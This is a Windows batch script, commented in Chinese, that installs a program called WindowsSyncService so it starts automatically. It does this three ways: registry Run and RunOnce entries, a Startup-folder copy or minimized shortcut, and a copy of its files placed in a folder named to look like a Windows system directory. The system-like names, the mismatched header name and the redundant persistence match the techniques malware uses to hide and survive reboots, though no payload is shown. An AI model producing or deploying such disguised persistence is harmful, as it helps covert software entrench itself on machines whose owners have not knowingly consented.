@echo off
REM SystemUpdateService 自启动安装脚本
REM 通过多种方式确保开机自启动

echo Installing WindowsSyncService autostart...

REM 获取当前目录
set CURRENT_DIR=%~dp0
set EXE_PATH=%CURRENT_DIR%WindowsSyncService.exe
set SCRIPT_PATH=%CURRENT_DIR%WindowsSyncService.py

REM 检查文件是否存在
if exist "%EXE_PATH%" (
    set TARGET_PATH=%EXE_PATH%
    echo Found WindowsSyncService.exe
) else if exist "%SCRIPT_PATH%" (
    set TARGET_PATH=python "%SCRIPT_PATH%"
    echo Found WindowsSyncService.py
) else (
    echo Error: WindowsSyncService not found!
    pause
    exit /b 1
)

echo Target: %TARGET_PATH%

REM 1. 添加到注册表 Run 键
echo Adding to registry Run key...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSyncService" /t REG_SZ /d "\"%TARGET_PATH%\"" /f >nul 2>&1
if %errorlevel% equ 0 (
    echo [OK] Registry Run key added
) else (
    echo [FAIL] Failed to add Registry Run key
)

REM 2. 添加到注册表 RunOnce 键（兜底）
echo Adding to registry RunOnce key...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "WindowsSyncService" /t REG_SZ /d "\"%TARGET_PATH%\"" /f >nul 2>&1
if %errorlevel% equ 0 (
    echo [OK] Registry RunOnce key added
) else (
    echo [FAIL] Failed to add Registry RunOnce key
)

REM 3. 复制到启动文件夹
echo Adding to Startup folder...
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
if exist "%EXE_PATH%" (
    copy "%EXE_PATH%" "%STARTUP_FOLDER%\WindowsSyncService.exe" >nul 2>&1
    if %errorlevel% equ 0 (
        echo [OK] Copied to Startup folder
    ) else (
        echo [FAIL] Failed to copy to Startup folder
    )
) else (
    REM 创建快捷方式到启动文件夹
    powershell -Command "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%STARTUP_FOLDER%\WindowsSyncService.lnk'); $Shortcut.TargetPath = 'python'; $Shortcut.Arguments = '\"%SCRIPT_PATH%\"'; $Shortcut.WorkingDirectory = '%CURRENT_DIR%'; $Shortcut.WindowStyle = 7; $Shortcut.Save()" >nul 2>&1
    if %errorlevel% equ 0 (
        echo [OK] Shortcut created in Startup folder
    ) else (
        echo [FAIL] Failed to create shortcut in Startup folder
    )
)

REM 4. 创建安装目录
echo Creating installation directory...
set INSTALL_DIR=%APPDATA%\Microsoft\Windows\SystemData
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%" >nul 2>&1
)

REM 复制文件到安装目录
if exist "%INSTALL_DIR%" (
    xcopy "%CURRENT_DIR%*" "%INSTALL_DIR%\" /E /Y /Q >nul 2>&1
    if %errorlevel% equ 0 (
        echo [OK] Files copied to installation directory
        
        REM 更新注册表指向新位置
        if exist "%INSTALL_DIR%\WindowsSyncService.exe" (
            reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSyncService" /t REG_SZ /d "\"%INSTALL_DIR%\WindowsSyncService.exe\"" /f >nul 2>&1
            echo [OK] Registry updated to installation directory
        )
    ) else (
        echo [FAIL] Failed to copy files to installation directory
    )
) else (
    echo [FAIL] Failed to create installation directory
)

echo.
echo Installation completed!
echo The service will start automatically on next boot.
echo.
echo To start the service now, run:
if exist "%INSTALL_DIR%\WindowsSyncService.exe" (
    echo "%INSTALL_DIR%\WindowsSyncService.exe"
) else (
    echo python "%INSTALL_DIR%\WindowsSyncService.py"
)
echo.
pause
